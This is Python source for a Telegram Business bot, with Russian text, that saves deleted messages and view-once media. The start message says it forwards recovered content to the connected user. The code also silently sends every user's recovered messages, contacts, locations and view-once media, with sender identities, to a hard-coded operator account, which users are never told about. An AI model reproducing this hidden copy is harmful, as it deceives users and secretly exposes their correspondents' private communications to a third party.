import os
import asyncio
import logging
from aiogram import Bot, Dispatcher
from aiogram.types import Message, BusinessMessagesDeleted, BusinessConnection
from aiogram.filters import Command

logging.basicConfig(level=logging.INFO)

TOKEN2 = os.getenv("TOKEN2")
_admin_raw = os.getenv("ADMIN_ID", "")
if not TOKEN2:
    raise ValueError("TOKEN2 не задан в переменных окружения")
if not _admin_raw or not "".join(filter(str.isdigit, _admin_raw)):
    raise ValueError("ADMIN_ID не задан или содержит некорректное значение")

ADMIN_ID = int("".join(filter(str.isdigit, _admin_raw)))

bot = Bot(token=TOKEN2)
dp = Dispatcher()

cache: dict[int, dict[int, Message]] = {}
connected_users: dict[int, dict] = {}
connection_owners: dict[str, int] = {}
banned_users: set[int] = set()
stats: dict[str, int] = {"deleted": 0, "one_time": 0, "connections": 0}


def save_to_cache(message: Message):
    cid = message.chat.id
    if cid not in cache:
        cache[cid] = {}
    cache[cid][message.message_id] = message


def user_line(user) -> str:
    line = f"👤 {user.full_name}"
    if user.username:
        line += f" (@{user.username})"
    line += f"\n🆔 {user.id}"
    return line


def chat_line(chat) -> str:
    name = chat.full_name or chat.title or str(chat.id)
    return f"💬 {name}"


def owner_line(owner_id: int) -> str:
    info = connected_users.get(owner_id)
    if info:
        line = f"📨 Получатель: {info['name']}"
        if info.get("username"):
            line += f" (@{info['username']})"
        line += f" [ID: {owner_id}]"
    else:
        line = f"📨 Получатель: ID {owner_id}"
    return line


async def send_single(user_id: int, msg: Message, header: str):
    try:
        if msg.text:
            await bot.send_message(user_id, f"{header}\n✉️ {msg.text}")

        elif msg.photo:
            caption = header + (f"\n✉️ {msg.caption}" if msg.caption else "")
            await bot.send_photo(user_id, msg.photo[-1].file_id, caption=caption)

        elif msg.video:
            caption = header + (f"\n✉️ {msg.caption}" if msg.caption else "")
            await bot.send_video(user_id, msg.video.file_id, caption=caption)

        elif msg.voice:
            await bot.send_voice(user_id, msg.voice.file_id, caption=header)

        elif msg.video_note:
            await bot.send_message(user_id, header)
            await bot.send_video_note(user_id, msg.video_note.file_id)

        elif msg.audio:
            caption = header + (f"\n✉️ {msg.caption}" if msg.caption else "")
            await bot.send_audio(user_id, msg.audio.file_id, caption=caption)

        elif msg.document:
            caption = header + (f"\n✉️ {msg.caption}" if msg.caption else "")
            await bot.send_document(user_id, msg.document.file_id, caption=caption)

        elif msg.sticker:
            await bot.send_message(user_id, header)
            await bot.send_sticker(user_id, msg.sticker.file_id)

        elif msg.animation:
            caption = header + (f"\n✉️ {msg.caption}" if msg.caption else "")
            await bot.send_animation(user_id, msg.animation.file_id, caption=caption)

        elif msg.contact:
            c = msg.contact
            name = f"{c.first_name} {c.last_name or ''}".strip()
            await bot.send_message(user_id, f"{header}\n📞 Контакт: {name} — {c.phone_number}")

        elif msg.location:
            await bot.send_message(user_id, header)
            await bot.send_location(user_id, msg.location.latitude, msg.location.longitude)

        else:
            await bot.send_message(user_id, header)
            try:
                await bot.copy_message(user_id, msg.chat.id, msg.message_id)
            except Exception:
                await bot.send_message(user_id, "⚠️ Тип сообщения не удалось скопировать")

    except Exception as e:
        logging.error(f"Ошибка отправки пользователю {user_id}: {e}")


async def forward_deleted(msg: Message, owner_id: int):
    parts_owner = ["🗑 Удалено:"]
    if msg.from_user:
        parts_owner.append(user_line(msg.from_user))
    if msg.chat:
        parts_owner.append(chat_line(msg.chat))
    await send_single(owner_id, msg, "\n".join(parts_owner))

    if owner_id != ADMIN_ID:
        parts_admin = ["🗑 Удалено:", owner_line(owner_id)]
        if msg.from_user:
            parts_admin.append(user_line(msg.from_user))
        if msg.chat:
            parts_admin.append(chat_line(msg.chat))
        await send_single(ADMIN_ID, msg, "\n".join(parts_admin))


def is_media_message(msg: Message) -> bool:
    return bool(msg.photo or msg.video or msg.voice or msg.video_note or msg.audio or msg.animation)


@dp.business_connection()
async def handle_connection(bc: BusinessConnection):
    user_id = bc.user.id
    if bc.is_enabled:
        if user_id in banned_users:
            await bot.send_message(user_id, "🚫 Вы заблокированы и не можете пользоваться ботом.")
            return
        connection_owners[bc.id] = user_id
        connected_users[user_id] = {
            "name": bc.user.full_name,
            "username": bc.user.username or "",
        }
        stats["connections"] += 1
        await bot.send_message(user_id, "✅ Бот подключён! Теперь я сохраняю удалённые сообщения.")
        if user_id != ADMIN_ID:
            uname = f" (@{bc.user.username})" if bc.user.username else ""
            await bot.send_message(
                ADMIN_ID,
                f"🔔 Новый пользователь подключился:\n👤 {bc.user.full_name}{uname}\n🆔 {bc.user.id}"
            )
    else:
        connection_owners.pop(bc.id, None)
        connected_users.pop(user_id, None)
        await bot.send_message(user_id, "❌ Бот отключён от Business аккаунта.")


@dp.business_message()
async def handle_business_message(message: Message):
    owner_id = connection_owners.get(message.business_connection_id, ADMIN_ID)
    if owner_id in banned_users:
        return

    save_to_cache(message)

    # Одноразки: владелец отвечает на закэшированное медиа — бот пересылает
    if (
        message.from_user
        and message.from_user.id == owner_id
        and message.reply_to_message
    ):
        replied = message.reply_to_message
        cid = message.chat.id
        if cid in cache and replied.message_id in cache[cid]:
            original = cache[cid][replied.message_id]
            if is_media_message(original):
                stats["one_time"] += 1
                parts = ["👁 Одноразка:"]
                if original.from_user:
                    parts.append(user_line(original.from_user))
                if original.chat:
                    parts.append(chat_line(original.chat))
                await send_single(owner_id, original, "\n".join(parts))

                if owner_id != ADMIN_ID:
                    parts_admin = ["👁 Одноразка:", owner_line(owner_id)]
                    if original.from_user:
                        parts_admin.append(user_line(original.from_user))
                    if original.chat:
                        parts_admin.append(chat_line(original.chat))
                    await send_single(ADMIN_ID, original, "\n".join(parts_admin))


@dp.edited_business_message()
async def handle_edited(message: Message):
    save_to_cache(message)


@dp.deleted_business_messages()
async def handle_deleted(event: BusinessMessagesDeleted):
    cid = event.chat.id
    owner_id = connection_owners.get(event.business_connection_id, ADMIN_ID)
    if owner_id in banned_users:
        return
    for msg_id in event.message_ids:
        if cid in cache and msg_id in cache[cid]:
            msg = cache[cid][msg_id]
            stats["deleted"] += 1
            await forward_deleted(msg, owner_id)
            del cache[cid][msg_id]


# ──────────────────────────── Команды ────────────────────────────

START_TEXT = (
    '<tg-emoji emoji-id="5985478698722136468">👋</tg-emoji><b>Приветствую!</b>\n\n'
    'Инструкция по подключению бота на видео.<tg-emoji emoji-id="5773626993010546707">▶️</tg-emoji>\n\n'
    '<b>После подключения бот будет</b> <tg-emoji emoji-id="6039404727542747508">⌨️</tg-emoji>\n'
    "<blockquote>"
    '<tg-emoji emoji-id="6039802767931871481">⬇️</tg-emoji> Пересылать Удаленные сообщения.\n'
    '<tg-emoji emoji-id="6048390817033228573">📷</tg-emoji> Пересылать удаленные фото/видео.\n'
    '<tg-emoji emoji-id="5769230088960741619">1️⃣</tg-emoji> Пересылать одноразовые сообщения(для этого ответьте на них любым текстом).\n'
    '<tg-emoji emoji-id="6030722571412967168">🎤</tg-emoji> Пересылать удаленные Голосовые сообщения.\n'
    '<tg-emoji emoji-id="6039451237743595514">📎</tg-emoji> Пересылать удаленные GIF и Стикеры.\n'
    '<tg-emoji emoji-id="6030506650522096180">📹</tg-emoji> Пересылать удаленные кружочки.'
    "</blockquote>\n\n"
    '<b>Пользуйтесь!</b> <tg-emoji emoji-id="6030400221232501136">🤖</tg-emoji>'
)


@dp.message(Command("start"))
async def cmd_start(message: Message):
    await message.answer(START_TEXT, parse_mode="HTML")


@dp.message(Command("users"))
async def cmd_users(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    if not connected_users:
        await message.answer("👥 Нет подключённых пользователей.")
        return
    lines = ["👥 Подключённые пользователи:\n"]
    for uid, info in connected_users.items():
        ban_mark = " 🚫" if uid in banned_users else ""
        uname = f" (@{info['username']})" if info.get("username") else ""
        lines.append(f"• {info['name']}{uname} — 🆔 {uid}{ban_mark}")
    await message.answer("\n".join(lines))


@dp.message(Command("stats"))
async def cmd_stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer(
        "📊 Статистика бота:\n\n"
        f"👥 Всего подключений: {stats['connections']}\n"
        f"🗑 Перехвачено удалённых: {stats['deleted']}\n"
        f"👁 Перехвачено одноразок: {stats['one_time']}\n"
        f"🔗 Сейчас подключено: {len(connected_users)}\n"
        f"🚫 Заблокировано: {len(banned_users)}"
    )


@dp.message(Command("ban"))
async def cmd_ban(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("Использование: /ban <ID или @username>")
        return
    target = args[1].strip().lstrip("@")
    target_id = None
    if target.lstrip("-").isdigit():
        target_id = int(target)
    else:
        for uid, info in connected_users.items():
            if info.get("username", "").lower() == target.lower():
                target_id = uid
                break
    if target_id is None:
        await message.answer(f"❌ Пользователь '{target}' не найден среди подключённых.")
        return
    if target_id == ADMIN_ID:
        await message.answer("❌ Нельзя заблокировать администратора.")
        return
    banned_users.add(target_id)
    info = connected_users.get(target_id)
    name = info["name"] if info else str(target_id)
    await message.answer(f"🚫 Пользователь {name} (ID: {target_id}) заблокирован.")
    try:
        await bot.send_message(target_id, "🚫 Вы были заблокированы администратором.")
    except Exception:
        pass


@dp.message(Command("unban"))
async def cmd_unban(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("Использование: /unban <ID или @username>")
        return
    target = args[1].strip().lstrip("@")
    target_id = None
    if target.lstrip("-").isdigit():
        target_id = int(target)
    else:
        for uid, info in connected_users.items():
            if info.get("username", "").lower() == target.lower():
                target_id = uid
                break
    if target_id is None:
        await message.answer(f"❌ Пользователь '{target}' не найден.")
        return
    if target_id in banned_users:
        banned_users.discard(target_id)
        info = connected_users.get(target_id)
        name = info["name"] if info else str(target_id)
        await message.answer(f"✅ Пользователь {name} (ID: {target_id}) разблокирован.")
        try:
            await bot.send_message(target_id, "✅ Вы были разблокированы администратором.")
        except Exception:
            pass
    else:
        await message.answer(f"ℹ️ Пользователь {target_id} не заблокирован.")


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
